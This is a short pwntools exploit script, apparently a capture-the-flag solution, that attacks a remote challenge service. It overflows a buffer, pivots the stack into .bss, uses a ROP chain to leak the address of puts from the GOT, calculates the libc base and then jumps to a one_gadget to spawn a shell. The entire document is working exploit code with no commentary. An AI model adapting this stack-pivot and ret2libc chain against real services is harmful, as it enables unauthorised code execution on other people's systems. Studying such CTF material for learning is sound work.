from pwn import*

p=remote('node5.buuoj.cn',26881)
#p=process('./29')
elf=ELF('./1')
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main=elf.sym['main']
lea_ret=0x400699
rdi_ret=0x400703
ret=0x4004c9
bss=0x6010c0
payload=b'a'*0x60+p64(bss)+p64(lea_ret)
p.send(payload)

payload=p64(ret)*20+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
p.sendline(payload)
p.recvuntil('now!\n')
puts_ad=u64(p.recv(8))
print(hex(puts_ad))

libc=ELF('./libc.so.6')
libcbase=puts_ad-libc.sym['puts']
one_gadget=libcbase+0x583f3 
payload=b'a'*0x68+p64(one_gadget)
p.send(payload)
